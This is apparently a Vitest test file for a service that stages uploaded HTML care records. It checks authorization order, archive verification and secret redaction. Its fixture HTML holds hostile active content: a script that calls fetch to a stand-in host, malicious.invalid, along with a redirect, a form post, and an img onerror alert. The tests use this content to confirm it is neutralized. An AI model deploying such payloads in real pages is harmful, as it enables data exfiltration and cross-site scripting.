import { createHash } from "node:crypto";
import http from "node:http";
import https from "node:https";

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("server-only", () => ({}));

import { ImportError } from "./errors";
import { parseCentralCareHtml } from "./parser";
import {
  stageTrustedHtmlImport, trustedUploadOperationId,
  type StagingRpcClient, type TrustedStagingDependencies,
} from "./trusted-staging";
import { CURRENT_MAPPING_VERSION, type HtmlImportFile, type ImportActor } from "./types";
import { validateHtmlImportFile } from "./validation";
import { type ArchivedObject, wormArchiveInternals } from "./worm-archive";

const now = new Date("2026-09-11T10:01:00.000Z");
const createdAt = "2026-09-11T10:00:00.000Z";
const completedAt = "2026-09-11T10:00:30.000Z";
const reservationId = "30000000-0000-4000-8000-000000000001";
const actor: ImportActor = {
  organizationId: "10000000-0000-4000-8000-000000000001",
  branchId: "20000000-0000-4000-8000-000000000001",
  userId: "40000000-0000-4000-8000-000000000001",
  assuranceLevel: "aal2", recentAal2At: createdAt,
};
const secret = "SYNTHETIC_UPSTREAM_TOKEN_MUST_NOT_ESCAPE";
const syntheticName = "完全合成測試個案";
const html = `<!doctype html><html><head><meta charset="utf-8">
<script>fetch("https://malicious.invalid/collect")</script>
<meta http-equiv="refresh" content="0;url=https://malicious.invalid/redirect">
<link rel="stylesheet" href="https://malicious.invalid/style.css"></head><body>
<form action="https://malicious.invalid/post" onsubmit="return false">
<h5>需要服務者基本資料</h5><table><tr><th>個案姓名</th><td>${syntheticName}</td></tr></table>
<h5>未發布的合成區段</h5><table><tr><th>自訂欄位</th><td>保留待映射</td></tr></table>
<img src="https://malicious.invalid/pixel" onerror="alert(1)"></form></body></html>`;

function fixture() {
  const file: HtmlImportFile = {
    fileName: "synthetic.html", mimeType: "text/html", bytes: new TextEncoder().encode(html),
  };
  const validated = validateHtmlImportFile(file);
  const parsed = parseCentralCareHtml(validated, CURRENT_MAPPING_VERSION);
  const reference: ArchivedObject = {
    key: wormArchiveInternals.objectKey(actor, reservationId, validated.sha256),
    versionId: "synthetic-version-1", sha256: validated.sha256, byteLength: file.bytes.byteLength,
    createdAt, retainUntil: "2033-09-11T10:00:00.000Z",
  };
  const receipt = {
    reservation_id: reservationId, status: "completed", staging_only: true,
    formally_imported: false, file_sha256: validated.sha256,
    content_fingerprint: parsed.contentFingerprint, mapping_version: parsed.mappingVersion,
    payload_sha256: createHash("sha256").update(JSON.stringify(parsed)).digest("hex"),
    section_count: parsed.sections.length,
    field_count: parsed.fields.length, completed_at: completedAt, replayed: false,
  };
  const reservation = {
    reservation_id: reservationId, organization_id: actor.organizationId,
    branch_id: actor.branchId, actor_user_id: actor.userId,
    file_sha256: validated.sha256, file_name: file.fileName, mime_type: file.mimeType,
    file_size_bytes: file.bytes.byteLength, mapping_version: parsed.mappingVersion,
    created_at: createdAt, status: "queued", replayed: false, receipt: null,
  };
  return { file, validated, parsed, reference, receipt, reservation };
}

function harness() {
  const data = fixture();
  const order: string[] = [];
  const userRpc = vi.fn<StagingRpcClient["rpc"]>(async () => {
    order.push("reserve");
    return { data: structuredClone(data.reservation) as unknown, error: null as unknown };
  });
  const archive = vi.fn<TrustedStagingDependencies["archive"]["archive"]>(async () => {
    order.push("archive");
    return structuredClone(data.reference);
  });
  const workerRpc = vi.fn<StagingRpcClient["rpc"]>(async () => {
    order.push("complete");
    return { data: structuredClone(data.receipt) as unknown, error: null as unknown };
  });
  const dependencies = {
    userClient: { rpc: userRpc }, workerClient: { rpc: workerRpc }, archive: { archive },
  };
  return { ...data, dependencies, userRpc, workerRpc, archive, order };
}

async function capturedError(operation: Promise<unknown>, code: string) {
  const error: unknown = await operation.catch((caught: unknown) => caught);
  expect(error).toBeInstanceOf(ImportError);
  expect(error).toHaveProperty("code", code);
  expect(String(error)).not.toContain(secret);
  expect(JSON.stringify(error)).not.toContain(secret);
  expect(error).not.toHaveProperty("cause");
  return error;
}

describe("trusted HTML staging coordinator", () => {
  beforeEach(() => { vi.useFakeTimers(); vi.setSystemTime(now); });
  afterEach(() => { vi.useRealTimers(); vi.restoreAllMocks(); });

  it("reserves with user authority, verifies archive, then completes only with worker authority", async () => {
    const test = harness();
    const receipt = await stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-synthetic-1");
    expect(test.order).toEqual(["reserve", "archive", "complete"]);
    expect(test.userRpc).toHaveBeenCalledExactlyOnceWith("reserve_import_upload", {
      p_expected_organization_id: actor.organizationId, p_expected_branch_id: actor.branchId,
      p_idempotency_key: trustedUploadOperationId(actor, "upload-synthetic-1"),
      p_file_sha256: test.validated.sha256, p_file_name: test.file.fileName,
      p_mime_type: "text/html", p_file_size_bytes: test.file.bytes.byteLength,
      p_mapping_version: CURRENT_MAPPING_VERSION,
    });
    expect(test.archive).toHaveBeenCalledExactlyOnceWith(
      { organizationId: actor.organizationId, branchId: actor.branchId }, reservationId,
      test.file.bytes, test.validated.sha256, new Date(createdAt),
    );
    expect(test.workerRpc).toHaveBeenCalledExactlyOnceWith("complete_import_upload", {
      p_reservation_id: reservationId, p_parsed_payload: JSON.stringify(test.parsed), p_archive_reference: test.reference,
    });
    expect(receipt).toEqual(test.receipt);
    expect(receipt).toMatchObject({ staging_only: true, formally_imported: false });
    expect(JSON.stringify(receipt)).not.toContain(syntheticName);
    expect(receipt).not.toHaveProperty("fields");
    expect(receipt).not.toHaveProperty("file_name");
  });

  it("preserves unknown fields and statically neutralizes active content with zero network requests", async () => {
    const test = harness();
    const noNetwork = () => { throw new Error("Unexpected parser network request"); };
    const calls = [vi.spyOn(globalThis, "fetch").mockImplementation(noNetwork),
      vi.spyOn(http, "request").mockImplementation(noNetwork), vi.spyOn(http, "get").mockImplementation(noNetwork),
      vi.spyOn(https, "request").mockImplementation(noNetwork), vi.spyOn(https, "get").mockImplementation(noNetwork)];
    await stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-static");
    const submitted = JSON.parse(test.workerRpc.mock.calls[0]![1].p_parsed_payload as string) as typeof test.parsed;
    expect(submitted.fields).toEqual(expect.arrayContaining([expect.objectContaining({
      mappingState: "unknown", targetPath: null, normalizedValue: "保留待映射",
    })]));
    expect(submitted.security).toMatchObject({
      parser: "cheerio-static", scriptElementsBlocked: 1, formElementsNeutralized: 1,
      redirectElementsBlocked: 1, externalRequestCount: 0,
    });
    for (const call of calls) expect(call.mock.calls.length).toBe(0);
  });

  it("owns bytes and metadata before the first await so caller mutation cannot change archived content", async () => {
    const test = harness();
    const mutableActor = { ...actor };
    const originalBytes = test.file.bytes.slice();
    test.userRpc.mockImplementation(async () => {
      test.file.bytes.fill(0);
      test.file.fileName = "changed.html";
      test.file.mimeType = "application/xhtml+xml";
      mutableActor.branchId = "20000000-0000-4000-8000-000000000002";
      mutableActor.userId = "40000000-0000-4000-8000-000000000002";
      await Promise.resolve();
      return { data: test.reservation, error: null };
    });
    await stageTrustedHtmlImport(test.dependencies, mutableActor, test.file, "upload-owned-bytes");
    const archiveArguments = test.archive.mock.calls[0]!;
    expect(archiveArguments[0]).toEqual({ organizationId: actor.organizationId, branchId: actor.branchId });
    expect(archiveArguments[2]).toEqual(originalBytes);
    expect(archiveArguments[2]).not.toBe(test.file.bytes);
    expect(test.userRpc.mock.calls[0]![1]).toHaveProperty("p_file_name", "synthetic.html");
    expect(test.workerRpc.mock.calls[0]![1].p_parsed_payload).toEqual(JSON.stringify(test.parsed));
  });

  it("binds normalized MIME instead of caller spelling and charset parameters", async () => {
    const test = harness();
    test.file.mimeType = "TEXT/HTML; charset=UTF-8";
    await stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-mime");
    expect(test.userRpc.mock.calls[0]![1]).toHaveProperty("p_mime_type", "text/html");
  });

  it.each(["", " ", "a".repeat(201)])("rejects invalid operation key before any persistence", async (key) => {
    const test = harness();
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, key), "IMPORT_STAGING_INVALID_REQUEST");
    expect(test.order).toEqual([]);
  });

  it.each([
    ["AAL1", { assuranceLevel: "aal1" as const }],
    ["missing reauthentication", { recentAal2At: null }],
    ["expired reauthentication", { recentAal2At: "2026-09-11T09:40:00.000Z" }],
    ["future reauthentication", { recentAal2At: "2026-09-12T10:00:00.000Z" }],
  ])("rejects %s before reservation or archive", async (_label, changes) => {
    const test = harness();
    await capturedError(stageTrustedHtmlImport(test.dependencies, { ...actor, ...changes }, test.file, "upload-1"), "RECENT_AAL2_REQUIRED");
    expect(test.order).toEqual([]);
  });

  it.each([
    ["filename", (file: HtmlImportFile) => { file.fileName = "synthetic.txt"; }],
    ["MIME", (file: HtmlImportFile) => { file.mimeType = "text/plain"; }],
    ["empty file", (file: HtmlImportFile) => { file.bytes = new Uint8Array(); }],
    ["unsafe charset", (file: HtmlImportFile) => {
      file.bytes = new TextEncoder().encode(`<!doctype html><meta charset="${secret}">`);
    }],
  ])("rejects invalid %s with fixed, non-sensitive error before reservation", async (_label, change) => {
    const test = harness();
    change(test.file);
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-1"), "IMPORT_STAGING_INVALID_FILE");
    expect(test.order).toEqual([]);
  });

  it.each([
    ["organization", { organization_id: "10000000-0000-4000-8000-000000000002" }],
    ["branch", { branch_id: "20000000-0000-4000-8000-000000000002" }],
    ["actor", { actor_user_id: "40000000-0000-4000-8000-000000000002" }],
    ["file hash", { file_sha256: "0".repeat(64) }],
    ["filename", { file_name: "other.html" }],
    ["MIME", { mime_type: "application/xhtml+xml" }],
    ["length", { file_size_bytes: 1 }],
    ["mapping version", { mapping_version: "unreviewed-version@99" }],
    ["reservation ID", { reservation_id: "../other" }],
    ["created date", { created_at: "invalid" }],
    ["future date", { created_at: "2027-09-11T10:00:00.000Z" }],
    ["expired retention", { created_at: "2010-09-11T10:00:00.000Z" }],
    ["raw extra field", { raw_html: secret }],
    ["wrong status", { status: "imported" }],
  ])("rejects reservation %s mismatch before archiving", async (_label, changes) => {
    const test = harness();
    test.userRpc.mockResolvedValue({ data: { ...test.reservation, ...changes }, error: null });
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-1"), "IMPORT_STAGING_INVALID_RESPONSE");
    expect(test.archive).not.toHaveBeenCalled();
    expect(test.workerRpc).not.toHaveBeenCalled();
  });

  it("replays a completed immutable receipt without archiving or completing again", async () => {
    const test = harness();
    const replayReceipt = { ...test.receipt, replayed: true };
    test.userRpc.mockResolvedValue({ data: {
      ...test.reservation, status: "completed", replayed: true, receipt: replayReceipt,
    }, error: null });
    await expect(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-replay")).resolves.toEqual(replayReceipt);
    expect(test.archive).not.toHaveBeenCalled();
    expect(test.workerRpc).not.toHaveBeenCalled();
  });

  it.each([
    ["queued receipt", "queued", false, true, false],
    ["completed without receipt", "completed", true, false, true],
    ["completed is not replay", "completed", false, true, true],
    ["completed receipt is not replay", "completed", true, true, false],
  ])("rejects contradictory %s state without persisting more data", async (_label, status, replayed, hasReceipt, receiptReplayed) => {
    const test = harness();
    test.userRpc.mockResolvedValue({ data: {
      ...test.reservation, status, replayed,
      receipt: hasReceipt ? { ...test.receipt, replayed: receiptReplayed } : null,
    }, error: null });
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-state"), "IMPORT_STAGING_INVALID_RESPONSE");
    expect(test.archive).not.toHaveBeenCalled();
    expect(test.workerRpc).not.toHaveBeenCalled();
  });

  it("resumes a queued reservation using the original server timestamp, not a rolling retry time", async () => {
    const test = harness();
    vi.setSystemTime(new Date("2026-09-12T10:00:00.000Z"));
    test.userRpc.mockResolvedValue({ data: { ...test.reservation, replayed: true }, error: null });
    await stageTrustedHtmlImport(test.dependencies, { ...actor, recentAal2At: new Date().toISOString() }, test.file, "upload-resume");
    const archiveArguments = test.archive.mock.calls[0]!;
    expect(archiveArguments[4]).toEqual(new Date(createdAt));
  });

  it("does not archive another operation's duplicate or pending bytes", async () => {
    const test = harness();
    test.userRpc.mockResolvedValue({ data: null, error: { code: "23505", message: secret, details: secret } });
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-other-key"), "IMPORT_STAGING_DUPLICATE");
    expect(test.archive).not.toHaveBeenCalled();
    expect(test.workerRpc).not.toHaveBeenCalled();
  });

  it.each([
    ["key", { key: "organizations/other/raw.html" }],
    ["version", { versionId: "null" }],
    ["hash", { sha256: "0".repeat(64) }],
    ["length", { byteLength: 1 }],
    ["created time", { createdAt: "2026-09-11T10:00:01.000Z" }],
    ["short retention", { retainUntil: "2033-09-11T09:59:59.000Z" }],
    ["invalid retention", { retainUntil: "invalid" }],
    ["unexpected content", { raw_html: secret }],
  ])("rejects archive %s mismatch before database completion", async (_label, changes) => {
    const test = harness();
    test.archive.mockResolvedValue({ ...test.reference, ...changes });
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-1"), "IMPORT_STAGING_INVALID_RESPONSE");
    expect(test.workerRpc).not.toHaveBeenCalled();
  });

  it.each([
    ["reservation", { reservation_id: "30000000-0000-4000-8000-000000000002" }],
    ["status", { status: "imported" }],
    ["staging boundary", { staging_only: false }],
    ["false promotion", { formally_imported: true }],
    ["file", { file_sha256: "0".repeat(64) }],
    ["fingerprint", { content_fingerprint: "0".repeat(64) }],
    ["mapping", { mapping_version: "unreviewed-version@99" }],
    ["payload hash", { payload_sha256: "invalid" }],
    ["different full payload with same fingerprint and counts", { payload_sha256: "0".repeat(64) }],
    ["section count", { section_count: 999 }],
    ["field count", { field_count: 999 }],
    ["completed time", { completed_at: "invalid" }],
    ["completed before reservation", { completed_at: "2026-09-11T09:59:59.000Z" }],
    ["completed in future", { completed_at: "2027-09-11T10:00:00.000Z" }],
    ["unexpected data", { raw_html: secret }],
  ])("does not return success for an inconsistent completion %s", async (_label, changes) => {
    const test = harness();
    test.workerRpc.mockResolvedValue({ data: { ...test.receipt, ...changes }, error: null });
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-1"), "IMPORT_STAGING_INVALID_RESPONSE");
  });

  it("validates completed replay metadata against the supplied file before returning success", async () => {
    const test = harness();
    test.userRpc.mockResolvedValue({ data: {
      ...test.reservation, status: "completed", replayed: true,
      receipt: { ...test.receipt, content_fingerprint: "0".repeat(64), replayed: true },
    }, error: null });
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-replay"), "IMPORT_STAGING_INVALID_RESPONSE");
    expect(test.archive).not.toHaveBeenCalled();
  });

  it.each(["reservation", "completion"])("redacts %s database denial details", async (step) => {
    const test = harness();
    const client = step === "reservation" ? test.userRpc : test.workerRpc;
    client.mockResolvedValue({ data: null, error: { code: "42501", message: secret, hint: secret } });
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-1"), "IMPORT_STAGING_DENIED");
    if (step === "reservation") expect(test.archive).not.toHaveBeenCalled();
  });

  it.each(["reservation", "completion"])("redacts %s request conflict details", async (step) => {
    const test = harness();
    const client = step === "reservation" ? test.userRpc : test.workerRpc;
    client.mockResolvedValue({ data: null, error: { code: "22023", message: secret } });
    const error = await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-conflict"), "IMPORT_STAGING_INVALID_REQUEST");
    expect(error).toHaveProperty("httpStatus", 409);
  });

  it.each(["reservation", "completion"])("rejects malformed %s RPC success body", async (step) => {
    const test = harness();
    const client = step === "reservation" ? test.userRpc : test.workerRpc;
    client.mockResolvedValue({ data: null, error: null });
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-empty"), "IMPORT_STAGING_INVALID_RESPONSE");
  });

  it.each(["reservation", "archive", "completion"])("reports unknown outcome safely after a %s timeout", async (step) => {
    const test = harness();
    const timeout = Object.assign(new Error(secret), { code: "ETIMEDOUT", cause: new Error(secret) });
    if (step === "reservation") test.userRpc.mockRejectedValue(timeout);
    else if (step === "archive") test.archive.mockRejectedValue(timeout);
    else test.workerRpc.mockRejectedValue(timeout);
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-timeout"),
      step === "archive" ? "IMPORT_STAGING_ARCHIVE_UNCONFIRMED" : "IMPORT_STAGING_RESULT_UNKNOWN");
    if (step !== "completion") expect(test.workerRpc).not.toHaveBeenCalled();
  });

  it.each(["reservation", "archive", "completion"])("does not trust %s dependency ImportError message or sensitive fields", async (step) => {
    const test = harness();
    const failure = new ImportError(secret, secret, 403, secret);
    if (step === "reservation") test.userRpc.mockRejectedValue(failure);
    else if (step === "archive") test.archive.mockRejectedValue(failure);
    else test.workerRpc.mockRejectedValue(failure);
    await capturedError(stageTrustedHtmlImport(test.dependencies, actor, test.file, "upload-1"),
      step === "archive" ? "IMPORT_STAGING_ARCHIVE_UNCONFIRMED" : "IMPORT_STAGING_RESULT_UNKNOWN");
    if (step !== "completion") expect(test.workerRpc).not.toHaveBeenCalled();
  });
});

describe("trusted upload operation identity", () => {
  it("derives a stable UUID without exposing the raw idempotency key", () => {
    const id = trustedUploadOperationId(actor, secret);
    expect(id).toMatch(/^[a-f0-9]{8}-[a-f0-9]{4}-[1-8][a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}$/u);
    expect(trustedUploadOperationId({ ...actor }, secret)).toBe(id);
    expect(id).not.toContain(secret);
  });

  it("separates organization, branch, actor and raw request key namespaces", () => {
    const identities = [
      trustedUploadOperationId(actor, "upload-1"), trustedUploadOperationId(actor, "upload-2"),
      trustedUploadOperationId({ ...actor, organizationId: "10000000-0000-4000-8000-000000000002" }, "upload-1"),
      trustedUploadOperationId({ ...actor, branchId: "20000000-0000-4000-8000-000000000002" }, "upload-1"),
      trustedUploadOperationId({ ...actor, userId: "40000000-0000-4000-8000-000000000002" }, "upload-1"),
    ];
    expect(new Set(identities).size).toBe(identities.length);
  });
});
